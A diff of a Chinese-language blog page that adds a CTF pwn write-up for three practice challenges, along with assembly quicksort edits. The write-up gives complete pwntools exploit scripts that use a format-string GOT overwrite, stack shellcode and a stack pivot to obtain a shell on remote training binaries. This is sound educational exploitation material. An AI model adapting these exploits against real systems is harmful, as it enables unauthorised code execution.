@@ -179,6 +179,107 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/22/Writeup-for-Second-Week/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Garen Wang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Garen Wang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/01/22/Writeup-for-Second-Week/" class="post-title-link" itemprop="url">Writeup for Second Week</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-22 11:11:17" itemprop="dateCreated datePublished" datetime="2021-01-22T11:11:17+08:00">2021-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-23 23:05:32" itemprop="dateModified" datetime="2021-01-23T23:05:32+08:00">2021-01-23</time>
+              </span>
+
+          
+            <span id="/2021/01/22/Writeup-for-Second-Week/" class="post-meta-item leancloud_visitors" data-flag-title="Writeup for Second Week" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2021/01/22/Writeup-for-Second-Week/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/01/22/Writeup-for-Second-Week/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="axb-2019-fmt32"><a href="#axb-2019-fmt32" class="headerlink" title="axb_2019_fmt32"></a>axb_2019_fmt32</h2><p>32位格式化字符串漏洞，有几个特点需要注意：</p>
+<ol>
+<li>测偏移的时候会发现没有完整四位四位的偏移，此时需要在最开始多补一位，这样保证后面都是从8的偏移开始。</li>
+<li>用格式化字符串漏洞泄露libc的时候用<code>%s</code>，然后第一个4位是got.plt表上的地址，第二个4位才是真正的地址。</li>
+<li><code>fmtstr_payload</code>填了四个参数，其中注意<code>numbwritten</code>参数，意思是格式化字符串中前面已有的字符数。0xa就是<code>Repeater:A</code>的位数。</li>
+<li>最后劫持了<code>printf</code>的got表，填个分号做命令分割，就直接拿shell了。</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="string">&#x27;26090&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;XAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + p32(puts_got) + <span class="string">b&#x27;%8$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Repeater:A&quot;</span>)</span><br><span class="line">puts_addr = p.recv(<span class="number">8</span>)[-<span class="number">4</span>:]</span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line">log.info(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># log.info(hex(system_addr))</span></span><br><span class="line"><span class="comment"># log.info(hex(binsh_addr))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> + fmtstr_payload(<span class="number">8</span>, &#123;printf_got: system_addr&#125;, write_size=<span class="string">&#x27;byte&#x27;</span>, numbwritten=<span class="number">0xa</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>在当前栈空间外面写shellcode，gdb调出偏移，借助最开始泄露的地址写入shellcode在栈上的地址，就能跳转到栈上的shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, &#x27;28529&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">buf = p.recvline().strip()</span><br><span class="line">base_addr = <span class="built_in">int</span>(buf, <span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># print(len(shellcode))</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x16</span> - <span class="number">0x8</span> + <span class="number">0x4</span>) + p32(base_addr - <span class="number">0x1c</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>0x28的栈溢出只能输入0x30，这时候要用到栈劫持，新的知识点。</p>
+<p>大体思路就是先通过一个<code>leave</code>然后<code>ret</code>的gadget强行把栈缩小，然后我们就在当前部分的栈帧里去布置就可以了。</p>
+<p>直接粘核心exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">str_addr = ebp_addr - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(str_addr + <span class="number">0x10</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(str_addr) + p32(leave_ret)</span><br></pre></td></tr></table></figure>
+<p>这个payload的构造挺巧妙的，稍微分析下：</p>
+<p>最后的0x8个字节用字符串起始地址覆盖了ebp，后面紧接着<code>leave</code>和<code>ret</code>，<code>leave</code>的时候直接调到字符串其实地址，<code>ret</code>的时候从<code>aaaa</code>跳到后面的system函数地址。system参数，同样是用在栈上写字符串的方法解决的。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/17/CSAPP-Attack-Lab-Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -347,10 +448,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-01-16 22:18:04 / Modified: 23:57:22" itemprop="dateCreated datePublished" datetime="2021-01-16T22:18:04+08:00">2021-01-16</time>
+              <time title="Created: 2021-01-16 22:18:04" itemprop="dateCreated datePublished" datetime="2021-01-16T22:18:04+08:00">2021-01-16</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-01-22 00:03:23" itemprop="dateModified" datetime="2021-01-22T00:03:23+08:00">2021-01-22</time>
+              </span>
 
           
             <span id="/2021/01/16/glibc-Heap-Learning/" class="post-meta-item leancloud_visitors" data-flag-title="glibc Heap Learning" title="Views">
@@ -455,7 +562,7 @@
 <p>在里面的chunk会通过后续的“捡垃圾”（即chunk维护整理工作）进入到专属的chunk。</p>
 <p>与fast bin一样，unsorted bin也只有一组。也只是一个暂存的缓冲区域，该挑合适的chunk，还是去规定的bin找，万不得已最后才来搜垃圾堆嘛。。。</p>
 <h3 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h3><p>有一个原则：任意两个物理相邻的空闲chunk不能排在一起。（不过fast bin还是得除外的）</p>
-<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3><h2 id="堆有关的攻击手段"><a href="#堆有关的攻击手段" class="headerlink" title="堆有关的攻击手段"></a>堆有关的攻击手段</h2><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><h3 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h3><h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><h3 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h3>
+<h2 id="堆的工作流程"><a href="#堆的工作流程" class="headerlink" title="堆的工作流程"></a>堆的工作流程</h2><h3 id="malloc的工作流程"><a href="#malloc的工作流程" class="headerlink" title="malloc的工作流程"></a>malloc的工作流程</h3><h3 id="free的工作流程"><a href="#free的工作流程" class="headerlink" title="free的工作流程"></a>free的工作流程</h3>
       
     </div>
 
@@ -505,7 +612,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-18 10:29:35" itemprop="dateModified" datetime="2021-01-18T10:29:35+08:00">2021-01-18</time>
+                <time title="Modified: 2021-01-18 10:51:49" itemprop="dateModified" datetime="2021-01-18T10:51:49+08:00">2021-01-18</time>
               </span>
 
           
@@ -581,7 +688,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>没编译过，不过觉得问题不大。但愿如此（x</p>
 <p>Jan 17 upd：重新用熟悉的AT&amp;T语法自己手写了一遍汇编快排，这次用了指针，看上去比较清晰：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sar %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rax), (%rbx)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rax), (%rcx)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span class="line">_swap:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %r9, %rbx</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %rcx, %r8</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    leaq (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sarq %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rax), (%rbx)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rax), (%rcx)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span class="line">_swap:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _init_loop</span><br><span class="line">    movq (%rbx), r10</span><br><span class="line">    movq (%rcx), r11</span><br><span class="line">    movq r10, (%rcx)</span><br><span class="line">    movq r11, (%rbx)</span><br><span class="line">    incq %rbx</span><br><span class="line">    decq %rcx</span><br><span class="line"></span><br><span class="line">_recursive1:</span><br><span class="line">    cmpq %r9, %rbx</span><br><span class="line">    jge _recursive2</span><br><span class="line">    movq %rbx, %rdi</span><br><span class="line">    movq %r9, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _recursive2</span><br><span class="line"></span><br><span class="line">_recursive2:</span><br><span class="line">    cmpq %rcx, %r8</span><br><span class="line">    jge _after_loop</span><br><span class="line">    movq %r8, %rdi</span><br><span class="line">    movq %rcx, %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    jmp _after_loop</span><br><span class="line"></span><br><span class="line">_after_loop:</span><br><span class="line">    movq %rbp, %rsp</span><br><span class="line">    popq %rbp</span><br><span class="line">    retq</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    movq array, %rdi</span><br><span class="line">    leaq (array, 10, 4), %rsi</span><br><span class="line">    call _qsort</span><br><span class="line">    movl $0, %edi</span><br><span class="line">    movl $60, %eax</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/flyoutsan/article/details/62237779">https://blog.csdn.net/flyoutsan/article/details/62237779</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/orlion/p/5765339.html">https://www.cnblogs.com/orlion/p/5765339.html</a></p>
 <p>还有CSAPP的Chapter 3。不愧是CSAPP。</p>
@@ -604,7 +711,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/14/Jan-14-Writeup/">
+    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/01/14/Writeup-for-First-Week/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -618,7 +725,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/14/Jan-14-Writeup/" class="post-title-link" itemprop="url">Jan 14 Writeup</a>
+            <a href="/2021/01/14/Writeup-for-First-Week/" class="post-title-link" itemprop="url">Writeup for First Week</a>
         </h2>
 
         <div class="post-meta">
@@ -635,11 +742,11 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-01-16 00:26:04" itemprop="dateModified" datetime="2021-01-16T00:26:04+08:00">2021-01-16</time>
+                <time title="Modified: 2021-01-23 23:05:27" itemprop="dateModified" datetime="2021-01-23T23:05:27+08:00">2021-01-23</time>
               </span>
 
           
-            <span id="/2021/01/14/Jan-14-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="Jan 14 Writeup" title="Views">
